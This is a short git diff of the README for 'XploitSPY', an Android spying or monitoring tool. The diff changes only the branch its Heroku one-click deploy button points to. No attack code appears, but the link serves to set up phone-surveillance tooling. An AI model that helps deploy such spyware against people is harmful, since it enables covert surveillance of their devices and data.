@@ -3,7 +3,7 @@
 A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 </p>
 
-<a href="https://heroku.com/deploy?template=https://github.com/XploitWizer/XploitSPY">
+<a href="https://heroku.com/deploy?template=https://github.com/XploitWizer/XploitSPY/tree/herooku">
   <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
 </a>
 
